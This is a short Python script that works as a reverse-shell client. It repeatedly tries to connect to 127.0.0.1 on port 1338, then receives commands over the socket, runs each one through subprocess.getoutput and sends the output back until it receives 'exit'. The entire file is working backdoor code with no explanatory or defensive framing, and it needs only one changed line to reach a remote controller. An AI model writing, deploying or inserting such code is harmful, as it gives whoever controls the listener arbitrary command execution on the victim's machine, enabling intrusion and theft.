#!/usr/bin/python3
import socket
import subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
while True:
    try:
        s.connect(("127.0.0.1",1338))
        break
    except ConnectionRefusedError:
        pass

print("Connected")

while True:
    cmd = s.recv(1024).decode()
    if cmd == "exit":
        break
    op = subprocess.getoutput(cmd)
    s.send(op.encode())
s.close()